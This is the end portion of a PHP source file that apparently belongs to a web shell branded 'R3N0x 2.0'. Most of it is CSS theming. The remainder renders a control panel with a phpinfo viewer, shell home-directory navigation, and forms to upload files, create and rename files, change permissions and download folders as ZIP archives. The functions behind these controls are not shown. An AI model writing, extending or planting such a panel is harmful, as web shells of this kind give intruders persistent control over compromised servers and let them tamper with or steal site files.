  color: #89ffac;
  font-size: 13px;
  margin-top: 8px;
  opacity: 0.8;
}

.zip-panel {
  margin-top: 0;
  margin-left: 10px;
  width: auto;
  max-width: none;
  display: inline-block;
  vertical-align: top;
}

.zip-panel h4 {
  margin-top: 0;
}

.zip-btn {
  display: inline-block;
  padding: 10px 16px;
  border-radius: 6px;
  text-decoration: none;
  font-weight: 700;
  border: 1px solid rgba(124, 255, 154, 0.22);
  background: linear-gradient(135deg, #0f5, #063);
  color: #fff;
}

.zip-btn:hover {
  text-decoration: none;
  filter: brightness(1.05);
}

.rename-panel {
  margin-left: 10px;
  display: inline-block;
  vertical-align: top;
}

.theme-switcher {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  justify-content: center;
  align-items: center;
  margin: 0 0 18px;
}

.theme-switcher form {
  width: auto;
  margin: 0;
  padding: 0;
  background: transparent;
  border: none;
  box-shadow: none;
}

.theme-switcher-btn {
  all: unset;
  cursor: pointer;
  padding: 10px 14px;
  border-radius: 999px;
  border: 1px solid rgba(124, 255, 154, 0.28);
  background: rgba(2, 12, 5, 0.82);
  color: #89ffac;
  font-weight: 700;
  letter-spacing: 0.6px;
  text-transform: uppercase;
}

.theme-switcher-btn.active {
  background: linear-gradient(135deg, #0f5, #063);
  color: #041006;
  box-shadow: 0 0 18px rgba(0, 255, 85, 0.22);
}

.quick-links {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  justify-content: center;
  align-items: center;
  margin: 0 0 16px;
}

.quick-link-btn,
.quick-link-form button {
  all: unset;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 9px 14px;
  border-radius: 10px;
  border: 1px solid rgba(124, 255, 154, 0.25);
  background: rgba(2, 12, 5, 0.82);
  color: #b6ffca;
  font-weight: 700;
  box-shadow: 0 0 0 1px rgba(124, 255, 154, 0.04);
}

.quick-link-btn:hover,
.quick-link-form button:hover {
  background: rgba(0, 255, 85, 0.08);
  color: #ffffff;
}

.quick-link-form {
  margin: 0;
  padding: 0;
  width: auto;
  background: transparent;
  border: none;
  box-shadow: none;
}

.modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.72);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 9999;
  padding: 20px;
}

.modal-backdrop.open {
  display: flex;
}

.modal-panel {
  width: min(1100px, 96vw);
  height: min(86vh, 900px);
  background: #020602;
  border: 1px solid rgba(124, 255, 154, 0.22);
  border-radius: 14px;
  box-shadow: 0 0 0 1px rgba(124, 255, 154, 0.08), 0 24px 60px rgba(0, 0, 0, 0.55);
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

.modal-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 12px;
  padding: 12px 14px;
  border-bottom: 1px solid rgba(124, 255, 154, 0.14);
  color: #89ffac;
}

.modal-title {
  font-weight: 700;
  letter-spacing: 0.5px;
}

.modal-close {
  all: unset;
  cursor: pointer;
  color: #b6ffca;
  font-size: 20px;
  line-height: 1;
}

.modal-close:hover {
  color: #ffffff;
}

.modal-frame {
  width: 100%;
  height: 100%;
  border: 0;
  background: #fff;
}

.info-tile {
  flex: 1 1 calc(25% - 15px);
  background: rgba(2, 12, 5, 0.92);
  color: #b6ffca;
  padding: 10px;
  border-radius: 10px;
  box-sizing: border-box;
  text-align: center;
  font-family: Arial, sans-serif;
  margin-bottom: 10px;
  font-size: 14px;
  border: 1px solid rgba(124, 255, 154, 0.22);
  box-shadow: 0 0 0 1px rgba(124, 255, 154, 0.08), 0 0 22px rgba(0, 255, 85, 0.08);
}

.breadcrumb {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  justify-content: center;
  gap: 6px;
  margin: 6px 0 8px;
  color: #89ffac;
}

.breadcrumb-form {
  display: inline-block;
  margin: 0;
}

.breadcrumb-sep,
.breadcrumb-root {
  color: #6ee7a0;
  font-weight: 700;
}

.breadcrumb-pill {
  display: inline-flex;
  align-items: center;
  padding: 7px 12px;
  border-radius: 999px;
  border: 1px solid rgba(124, 255, 154, 0.22);
  background: rgba(2, 12, 5, 0.82);
  color: #b6ffca;
  font-weight: 700;
  line-height: 1;
  box-shadow: 0 0 0 1px rgba(124, 255, 154, 0.06), 0 0 14px rgba(0, 255, 85, 0.08);
}

.breadcrumb-pill.is-current {
  background: linear-gradient(135deg, #0f5, #063);
  color: #041006;
  border-color: rgba(124, 255, 154, 0.45);
  box-shadow: 0 0 18px rgba(0, 255, 85, 0.18);
}

.breadcrumb .nav-form-inline .nav-btn {
  color: #9ef6b8;
}

.breadcrumb .nav-form-inline .nav-btn:hover {
  color: #ffffff;
}

body.theme-cyber {
  color: #ffd6d6;
  background:
    radial-gradient(circle at top left, rgba(255, 64, 64, 0.18), transparent 28%),
    radial-gradient(circle at top right, rgba(0, 255, 85, 0.14), transparent 24%),
    linear-gradient(180deg, #040204 0%, #09110a 100%);
}

body.theme-cyber .box,
body.theme-cyber .info-tile,
body.theme-cyber form,
body.theme-cyber .file-table,
body.theme-cyber .upload-panel {
  border-color: rgba(255, 78, 78, 0.48);
  box-shadow:
    0 0 0 1px rgba(255, 78, 78, 0.16),
    0 0 28px rgba(0, 255, 85, 0.08),
    inset 0 0 0 1px rgba(255, 78, 78, 0.08);
}

body.theme-cyber .info-tile {
  background:
    linear-gradient(135deg, rgba(32, 2, 2, 0.96), rgba(4, 22, 8, 0.92));
  color: #ffd4d4;
  border-color: rgba(255, 78, 78, 0.42);
}

body.theme-cyber .breadcrumb {
  color: #ffd4d4;
  text-shadow: 0 0 8px rgba(255, 45, 45, 0.18);
}

body.theme-cyber .breadcrumb-pill {
  background: linear-gradient(135deg, rgba(64, 4, 4, 0.96), rgba(4, 22, 8, 0.96));
  border-color: rgba(255, 78, 78, 0.42);
  color: #ffc8c8;
  box-shadow:
    0 0 0 1px rgba(255, 78, 78, 0.1),
    0 0 18px rgba(255, 45, 45, 0.12);
}

body.theme-cyber .breadcrumb-pill.is-current {
  background: linear-gradient(135deg, #ff2d2d, #0f5);
  color: #040a05;
  border-color: rgba(255, 78, 78, 0.55);
  box-shadow:
    0 0 0 1px rgba(255, 78, 78, 0.18),
    0 0 24px rgba(255, 45, 45, 0.22);
}

body.theme-cyber .breadcrumb-sep {
  color: #ff6b6b;
}

body.theme-cyber .breadcrumb .nav-form-inline .nav-btn {
  color: #ffaaaa;
}

body.theme-cyber .quick-link-btn,
body.theme-cyber .quick-link-form button,
body.theme-cyber .theme-switcher-btn,
body.theme-cyber .nav-btn {
  border-color: rgba(255, 78, 78, 0.32);
}

body.theme-cyber h3,
body.theme-cyber h4,
body.theme-cyber .name-cell {
  color: #ff9d9d;
}

body.theme-cyber a,
body.theme-cyber .sort-btn,
body.theme-cyber .nav-btn,
body.theme-cyber .pager-summary {
  color: #96ffb2;
}

body.theme-cyber .file-table th,
body.theme-cyber .action-btn,
body.theme-cyber .pager-btn,
body.theme-cyber .search-bar button {
  background: linear-gradient(135deg, #ff2d2d, #0f5);
}

body.theme-cyber .file-table th {
  color: #fff2f2;
}

body.theme-corporate {
  color: #dbeafe;
  background:
    radial-gradient(circle at top right, rgba(59, 130, 246, 0.14), transparent 24%),
    linear-gradient(180deg, #07111f 0%, #0b1220 100%);
}

body.theme-corporate .box,
body.theme-corporate .info-tile,
body.theme-corporate form,
body.theme-corporate .file-table,
body.theme-corporate .upload-panel {
  background: rgba(10, 18, 34, 0.96);
  border-color: rgba(125, 211, 252, 0.22);
  box-shadow:
    0 0 0 1px rgba(125, 211, 252, 0.08),
    0 14px 32px rgba(0, 0, 0, 0.28);
}

body.theme-corporate .info-tile {
  background:
    linear-gradient(135deg, rgba(8, 15, 28, 0.98), rgba(17, 24, 39, 0.96));
  color: #e0f2fe;
  border-color: rgba(125, 211, 252, 0.24);
}

body.theme-corporate .breadcrumb {
  color: #e0f2fe;
}

body.theme-corporate h3,
body.theme-corporate h4,
body.theme-corporate .name-cell {
  color: #e2e8f0;
}

body.theme-corporate a,
body.theme-corporate .sort-btn,
body.theme-corporate .nav-btn,
body.theme-corporate .pager-summary {
  color: #7dd3fc;
}

body.theme-corporate .file-table th,
body.theme-corporate .action-btn,
body.theme-corporate .pager-btn,
body.theme-corporate .search-bar button {
  background: linear-gradient(135deg, #0f172a, #334155);
}

body.theme-corporate .file-table th {
  color: #f8fafc;
}

body.theme-corporate .breadcrumb-pill {
  background: linear-gradient(135deg, rgba(8, 15, 28, 0.98), rgba(17, 24, 39, 0.96));
  border-color: rgba(125, 211, 252, 0.28);
  color: #dbeafe;
  box-shadow:
    0 0 0 1px rgba(125, 211, 252, 0.08),
    0 0 16px rgba(59, 130, 246, 0.08);
}

body.theme-corporate .breadcrumb-pill.is-current {
  background: linear-gradient(135deg, #38bdf8, #0f172a);
  color: #eff6ff;
  border-color: rgba(125, 211, 252, 0.42);
}

body.theme-corporate .breadcrumb-sep {
  color: #93c5fd;
}

body.theme-corporate .breadcrumb .nav-form-inline .nav-btn {
  color: #bfdbfe;
}

body.theme-corporate .quick-link-btn,
body.theme-corporate .quick-link-form button,
body.theme-corporate .theme-switcher-btn,
body.theme-corporate .nav-btn {
  border-color: rgba(125, 211, 252, 0.24);
}

body.theme-terminal {
  color: #8dffaf;
  background:
    radial-gradient(circle at top, rgba(0, 255, 85, 0.12), transparent 22%),
    linear-gradient(180deg, #010402 0%, #020a04 100%);
}

body.theme-terminal .box,
body.theme-terminal .info-tile,
body.theme-terminal form,
body.theme-terminal .file-table,
body.theme-terminal .upload-panel {
  background: rgba(1, 8, 3, 0.96);
  border-color: rgba(124, 255, 154, 0.28);
  box-shadow:
    0 0 0 1px rgba(124, 255, 154, 0.1),
    0 0 28px rgba(0, 255, 85, 0.08);
}

body.theme-terminal .info-tile {
  background:
    linear-gradient(135deg, rgba(1, 8, 3, 0.98), rgba(2, 12, 5, 0.96));
  color: #b6ffca;
  border-color: rgba(124, 255, 154, 0.24);
}

body.theme-terminal .breadcrumb {
  color: #b6ffca;
  text-shadow: 0 0 10px rgba(0, 255, 85, 0.08);
}

body.theme-terminal .breadcrumb-pill {
  background: linear-gradient(135deg, rgba(1, 8, 3, 0.98), rgba(2, 12, 5, 0.95));
  border-color: rgba(124, 255, 154, 0.28);
  color: #d7ffe4;
}

body.theme-terminal .breadcrumb-pill.is-current {
  background: linear-gradient(135deg, #0f5, #063);
  color: #041006;
  border-color: rgba(124, 255, 154, 0.52);
}

body.theme-terminal .breadcrumb-sep {
  color: #7CFF9A;
}

body.theme-terminal .breadcrumb .nav-form-inline .nav-btn {
  color: #c9ffe0;
}

body.theme-terminal .quick-link-btn,
body.theme-terminal .quick-link-form button,
body.theme-terminal .theme-switcher-btn,
body.theme-terminal .nav-btn {
  border-color: rgba(124, 255, 154, 0.3);
}
</style>';

echo '<body class="' . htmlspecialchars($themeClass, ENT_QUOTES) . '">';

echo '<div class="theme-switcher">';
$themeLabels = [
    'cyber' => 'Cyber Red/Green',
    'corporate' => 'Dark Corporate',
    'terminal' => 'Terminal Hacker',
];
foreach ($themeLabels as $key => $label) {
    echo '<form method="post">';
    echo '<input type="hidden" name="path" value="' . htmlspecialchars($path, ENT_QUOTES) . '">';
    echo '<input type="hidden" name="sort" value="' . htmlspecialchars(request_state('sort', 'name'), ENT_QUOTES) . '">';
    echo '<input type="hidden" name="order" value="' . htmlspecialchars(request_state('order', 'asc'), ENT_QUOTES) . '">';
    echo '<input type="hidden" name="page" value="' . htmlspecialchars(request_state('page', 1), ENT_QUOTES) . '">';
    echo '<input type="hidden" name="q" value="' . htmlspecialchars(request_state('q', ''), ENT_QUOTES) . '">';
    echo '<input type="hidden" name="theme" value="' . htmlspecialchars($key, ENT_QUOTES) . '">';
    echo '<button type="submit" class="theme-switcher-btn' . ($theme === $key ? ' active' : '') . '">' . htmlspecialchars($label) . '</button>';
    echo '</form>';
}
echo '</div>';

echo '<div class="quick-links">';
echo nav_button('Home', shell_home_dir(), 'quick-link-form');
echo nav_button('Current Dir', getcwd() ?: $path, 'quick-link-form');
echo '<button type="button" class="quick-link-btn" onclick="openPhpInfo()">PHPINFO</button>';
echo '</div>';
echo '<div id="phpinfo-modal" class="modal-backdrop" onclick="if(event.target===this){closePhpInfo();}">';
echo '<div class="modal-panel">';
echo '<div class="modal-header">';
echo '<div class="modal-title">PHPINFO</div>';
echo '<button type="button" class="modal-close" onclick="closePhpInfo()">×</button>';
echo '</div>';
echo '<iframe id="phpinfo-frame" class="modal-frame" title="PHPINFO"></iframe>';
echo '</div>';
echo '</div>';

echo '<h1 style="text-align:center; font-size: 22px;">Welcome to R3N0x 2.0</h1>';
echo render_breadcrumbs($path);

$parent = realpath(dirname($path));
if ($parent !== false && $parent !== $path && strpos($parent, $root) === 0) {
    echo nav_button('⬆ Parent', $parent, 'nav-form-parent');
    echo '<br><br>';
}

echo '<form class="search-bar" method="post">';
echo '<input type="hidden" name="path" value="' . htmlspecialchars($path, ENT_QUOTES) . '">';
echo '<input type="hidden" name="sort" value="' . htmlspecialchars(request_state('sort', 'name'), ENT_QUOTES) . '">';
echo '<input type="hidden" name="order" value="' . htmlspecialchars(request_state('order', 'asc'), ENT_QUOTES) . '">';
echo '<input type="hidden" name="page" value="1">';
echo '<input type="search" name="q" placeholder="Search files and folders..." value="' . htmlspecialchars(request_state('q', ''), ENT_QUOTES) . '">';
echo '<button type="submit">Search</button>';
echo '</form>';
if (trim((string)request_state('q', '')) !== '') {
    echo '<form method="post" class="pager-form" style="display:inline-block; margin-left:10px;">';
    echo '<input type="hidden" name="path" value="' . htmlspecialchars($path, ENT_QUOTES) . '">';
    echo '<input type="hidden" name="sort" value="' . htmlspecialchars(request_state('sort', 'name'), ENT_QUOTES) . '">';
    echo '<input type="hidden" name="order" value="' . htmlspecialchars(request_state('order', 'asc'), ENT_QUOTES) . '">';
    echo '<input type="hidden" name="page" value="1">';
    echo '<input type="hidden" name="q" value="">';
    echo '<button type="submit" class="pager-btn">Clear</button>';
    echo '</form>';
}

if ($renameTarget !== null) {
    echo '<form method="post" class="rename-panel">';
    echo '<input type="hidden" name="path" value="' . htmlspecialchars($path, ENT_QUOTES) . '">';
    echo '<input type="hidden" name="rename_from" value="' . htmlspecialchars($renameTarget, ENT_QUOTES) . '">';
    echo '<input type="text" name="rename_to" placeholder="New name" value="' . htmlspecialchars($renameTarget, ENT_QUOTES) . '">';
    echo '<button type="submit">Rename ' . htmlspecialchars($renameType === 'folder' ? 'Folder' : 'File') . '</button>';
    echo '</form>';
}

echo "<div style='overflow-x:auto;'>";
list_files($path);
echo "</div>";

?>
<hr>
<div class="form-grid">
  <div>
    <h4>Create New File</h4>
    <form method="post">
      <input name="newfile" placeholder="filename.txt">
      <button>Create</button>
    </form>
  </div>

  <div>
    <h4>Rename File</h4>
    <form method="post">
      <input name="rename_from" placeholder="old.txt">
      <input name="rename_to" placeholder="new.txt">
      <button>Rename</button>
    </form>
  </div>

  <div>
    <h4>CHMOD</h4>
    <form method="post">
      <input name="chmod_file" placeholder="file.txt">
      <input name="mode" placeholder="e.g. 0644">
      <button>Change</button>
    </form>
  </div>

  <div class="upload-panel">
    <h4>Upload File</h4>
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="upload">
      <button>Upload</button>
    </form>
    <div class="upload-note">Drag-and-drop is not enabled yet, but this input now matches the active theme.</div>
  </div>

<div class="zip-panel">
  <h4>Download ZIP of Current Folder</h4>
  <?php echo '<a class="zip-btn" href="?path=' . urlencode($path) . '&zip=1">Download ZIP</a>'; ?>
</div>


</div>

</body>
